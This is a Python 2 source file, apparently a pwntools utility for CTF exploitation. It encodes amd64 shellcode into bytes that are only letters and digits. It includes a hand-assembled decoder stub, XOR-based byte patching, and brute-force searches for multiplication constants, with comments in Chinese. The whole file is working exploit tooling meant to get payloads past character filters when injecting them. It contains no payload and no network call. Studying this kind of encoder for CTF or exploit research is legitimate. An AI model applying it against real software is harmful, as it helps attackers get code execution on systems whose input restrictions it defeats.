#coding=utf8
from pwn import context,asm
from num_tbl import offset_tbl
context.arch = 'amd64'
# context.log_level = 'debug'

s = 'UVWXYZABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrstuvwxyz0123456789'
s = map(ord,list(s))

# nop = asm('push rcx')
# nop2 = asm('push rcx;pop rcx')
nop = 'Q'
nop2 = 'QY'

sc_set_encoder='''
/* set encoder */
/* 0x55555658 x 0x30 == 0x1000003080 (53,128) */
/* 0x55555734 x 0x30 == 0x10000059c0 (89,192) */
/* 0x55555654 x 0x5a == 0x1e00005988 (89,136) */
/* 0x66666742 x 0x64 == 0x28000055c8 (85,200) */

push   0x30
push   rsp
pop    rcx

imul   edi,DWORD PTR [rcx],0x55555658
push   rdi
pop    r8 /* 0x3080 */

imul   edi,DWORD PTR [rcx],0x55555734
push   rdi
pop    r9 /* 0x59c0 */

push   0x5a
push   rsp
pop    rcx

imul   edi,DWORD PTR [rcx],0x55555654
push   rdi
pop    r10 /* 0x5988 */

push   0x64
push   rsp
pop    rcx

imul   edi,DWORD PTR [rcx],0x66666742
push   rdi
pop    rdx /* 0x55c8 */

/* now status */
/* r8  : 0x3080 */
/* r9  : 0x59c0 */
/* r10 : 0x5988 */
/* rdx : 0x55c8 */
'''
# sc_set_encoder = asm(sc_set_encoder)
sc_set_encoder = 'j0TYi9XVUUWAXi94WUUWAYjZTYi9TVUUWAZjdTYi9BgffWZ'

# 计算encode后的shellcode，以及需要的加密步骤
def encode_sc(raw_sc):
	'''
	r8  : 0x3080
	r9  : 0x59c0
	r10 : 0x5988
	rdx : 0x55c8
	'''
	reg=['rdx','r8','r9','r10']
	dh=[0x55,0x30,0x59,0x59]
	dl=[0xc8,0x80,0xc0,0x88]

	__enc_sc=list(raw_sc)
	__idx_list=[]
	__reg_list=[]
	__hl_list=[]

	for i in range(len(raw_sc)):
		oc = ord(raw_sc[i])
		if oc not in s:
			if oc<0x80:
				for j,n in enumerate(dh):
					if oc^n in s:
						__enc_sc[i] = chr(oc^n)
						__idx_list.append(i)
						__reg_list.append(reg[j])
						__hl_list.append(1)
						# print i,reg[j]
						break
			else:
				for j,n in enumerate(dl):
					if oc^n in s:
						__enc_sc[i] = chr(oc^n)
						__idx_list.append(i)
						__reg_list.append(reg[j])
						__hl_list.append(0)
						# print i,reg[j]
						break
	__enc_sc = ''.join(__enc_sc)
	return (__enc_sc,__idx_list,__reg_list,__hl_list)


shift_tbl=[65,97,48,66,98,49,67,99,50,68,100,51,69,101,
		   52,70,102,53,71,103,54,72,104,55,73,105,56,
		   74,106,57,75,107,76,108,77,109,78,110,79,111,
		   80,112,81,113,82,114,83,115,84,116,85,117,86,
		   118,87,119,88,120,89,121,90,122,0]


dp_tbl={}
rdi=0
# 内部函数
def find_mul_inter(num):
	global dp_tbl
	if dp_tbl.get(num):
		return dp_tbl.get(num)
	for a in s:
		for b in s:
			for c in s:
				for d in s:
					num1 = (a<<24)+(b<<16)+(c<<8)+(d)
					for e in s:
						if (num1*e)&0xffffffff == num:
							dp_tbl[num] = (num1,e) # add to dp_tbl
							return (num1,e)
	return (0,0)

# 用来计算如何得到指定的offset
def find_mul(offset):
	global dp_tbl,rdi,shift_tbl

	if offset_tbl.get(offset):# table cache
		n,e,x = offset_tbl.get(offset)
		rdi = [n,e]
		return (n,e,x)
	if rdi == 0: #not used yet
		for x in shift_tbl:
			n,e = find_mul_inter(offset-x)
			if n != 0: # find
				rdi = [n,e]
				return (n,e,x)
	else: # rdi already used
		# let rdi not touch 
		already  = (rdi[0]*rdi[1])&0xffffffff
		if offset-already in shift_tbl: # we find offset
			return (rdi[0],rdi[1],offset-already)
		else: # not find :(
			for x in shift_tbl:
				n,e = find_mul_inter(offset-x)
				if n != 0: # find
					rdi = [n,e]
					return (n,e,x)
	print 'cant find mul for {} :('.format(offset)
	exit(0)

# 输出encoder的shellcode
def get_encoder(pre_len,in_idx,in_reg,in_hl):
	global rdi

	sc =''
	old_rdi=[0,0]
	for i,iidx in enumerate(in_idx):
		t_idx = pre_len+iidx
		n,e,x = find_mul(t_idx)
		if n == old_rdi[0] and e == old_rdi[1]: # edi not changed
			pass
		else:
			sc+='''/* set edi */
			push {};push rsp;pop rcx
			imul edi,[rcx],{}
			'''.format(n,e)
			old_rdi = rdi
		if in_reg[i] != 'rdx': #backup rdx and set
			sc+='''push rdx;push {};pop rdx
			'''.format(in_reg[i])

		if x == 0:
			if in_hl[i] == 0:
				sc+='''xor [rax+rdi],dl
				'''
			else:
				sc+='''xor [rax+rdi],dh
				'''
		else:
			if in_hl[i] == 0:
				sc+='''xor [rax+rdi+{}],dl
				'''.format(x)
			else:
				sc+='''xor [rax+rdi+{}],dh
				'''.format(x)

		if in_reg[i] != 'rdx': #restore rdx
			sc+='''pop rdx;
			'''
		
	return sc.replace('\t','').replace('    ','')


# MAIN FUNC <------ CALL THIS
def alphanum_encoder(sc,padding_len,encoder_len=0):
	r'''
	sc：需要encode的机器码
	padding_len：因为默认rax指向shellcode附近，这个字段的意思为 rax+padding_len == encoder的起始地址
	encoder_len：留给encoder的最大字节长度，请按照sc的情况合理设置(不设置即为默认的shellcode长度的4倍)

	地址构成：
	rax --> xxxxx  \
	        xxxxx  | padding_len (adjust addr to rax)
	        xxxxx  /
	encoder yyyyy  \
			yyyyy  | encoder_len
			yyyyy  /
	your_sc	zzzzz  \
			zzzzz  | encoded shellcode
			zzzzz  |
			zzzzz  /
	'''
	if encoder_len == 0:
		encoder_len = len(sc)*4
		if encoder_len < 0x50:
			encoder_len = 0x50
	enc_sc,idx_list,reg_list,hl_list = encode_sc(sc)
	encoder =  get_encoder(padding_len+encoder_len,idx_list,reg_list,hl_list)
	encoder = asm(encoder)

	final_sc = sc_set_encoder
	final_sc += encoder
	if encoder_len <len(final_sc):
		return alphanum_encoder(sc,padding_len,(len(final_sc)+0x10)) # recall and give more space
	sc_padding_len = encoder_len - len(final_sc)
	r = sc_padding_len/2
	t = sc_padding_len%2
	final_sc+=nop2*r+nop*t
	final_sc+=enc_sc
	return final_sc
